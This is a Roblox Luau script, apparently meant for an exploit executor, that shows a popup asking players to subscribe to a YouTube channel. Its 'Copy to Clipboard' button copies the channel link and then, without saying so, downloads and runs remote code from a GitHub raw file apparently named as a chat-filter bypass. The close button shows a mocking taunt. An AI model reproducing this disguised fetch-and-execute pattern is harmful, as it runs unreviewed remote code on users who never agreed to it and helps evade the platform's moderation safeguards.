local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TitleBar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local Message = Instance.new("TextLabel")
local SubscribeButton = Instance.new("TextButton")
local UIPadding = Instance.new("UIPadding")
local Notification = Instance.new("TextLabel")  -- New Notification label

-- ScreenGui Properties
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Frame Properties
Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 350, 0, 200)
Frame.BackgroundTransparency = 0.1

-- TitleBar Properties
TitleBar.Parent = Frame
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 30)

-- Title Properties
Title.Parent = TitleBar
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0.05, 0, 0, 0)
Title.Size = UDim2.new(0.9, 0, 1, 0)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "PromotionðŸ¤¯"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left

-- CloseButton Properties
CloseButton.Parent = TitleBar
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.BorderSizePixel = 0
CloseButton.Position = UDim2.new(0.93, 0, 0.1, 0)
CloseButton.Size = UDim2.new(0.05, 0, 0.8, 0)
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 16

-- Message Properties
Message.Parent = Frame
Message.BackgroundTransparency = 1
Message.Position = UDim2.new(0, 0, 0.2, 0)
Message.Size = UDim2.new(1, 0, 0.6, 0)
Message.Font = Enum.Font.SourceSans
Message.Text = "Subscribe to @zonkey9070"
Message.TextColor3 = Color3.fromRGB(0, 0, 0)
Message.TextSize = 20
Message.TextWrapped = true
Message.TextYAlignment = Enum.TextYAlignment.Center

-- SubscribeButton Properties
SubscribeButton.Parent = Frame
SubscribeButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
SubscribeButton.BorderSizePixel = 0
SubscribeButton.Position = UDim2.new(0.3, 0, 0.75, 0)
SubscribeButton.Size = UDim2.new(0.4, 0, 0.2, 0)
SubscribeButton.Font = Enum.Font.SourceSansBold
SubscribeButton.Text = "Copy to Clipboard"
SubscribeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubscribeButton.TextSize = 18

-- Notification Properties
Notification.Parent = ScreenGui
Notification.BackgroundTransparency = 1
Notification.Position = UDim2.new(0.5, 0, 0.4, 0)
Notification.Size = UDim2.new(0, 200, 0, 50)
Notification.Font = Enum.Font.SourceSansBold
Notification.Text = "you are very gay !1!1!1"
Notification.TextColor3 = Color3.fromRGB(255, 0, 0)
Notification.TextSize = 24
Notification.TextWrapped = true
Notification.TextYAlignment = Enum.TextYAlignment.Center
Notification.Visible = false

-- UIPadding for TitleBar
UIPadding.Parent = TitleBar
UIPadding.PaddingLeft = UDim.new(0.05, 0)

-- Function to close the popup with a notification
CloseButton.MouseButton1Click:Connect(function()
    -- Check if the notification is already visible
    if not Notification.Visible then
        -- Show the notification
        Notification.Visible = true
        
        -- Hide the notification after 1.5 seconds
        delay(1.5, function()
            Notification.Visible = false
        end)
    end
end)

-- Function to copy text to clipboard and perform animation
SubscribeButton.MouseButton1Click:Connect(function()
    setclipboard("www.youtube.com/@zonkey9070")
    SubscribeButton.Text = "Copied!"

    -- Disable moving the Frame
    TitleBar.Active = false

    -- Tween to fade to black
    local fadeTween = TweenService:Create(Frame, TweenInfo.new(0.5), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)})
    fadeTween:Play()
    
    fadeTween.Completed:Connect(function()
        -- Tween to move the Frame to the left
        local moveTween = TweenService:Create(Frame, TweenInfo.new(0.5), {Position = UDim2.new(-1, 0, 0.5, 0)})
        moveTween:Play()

        moveTween.Completed:Connect(function()
            -- Directly execute the code from the URL
            local url = "https://raw.githubusercontent.com/John142-dot/iforgor/main/chatbypassez"
            local success, result = pcall(function()
                return loadstring(game:HttpGet(url))()
            end)

            if success then
                print("Script executed successfully")
            else
                warn("Script execution failed: " .. result)
            end
        end)
    end)
end)

-- Prevent dragging until SubscribeButton is clicked
TitleBar.Active = false
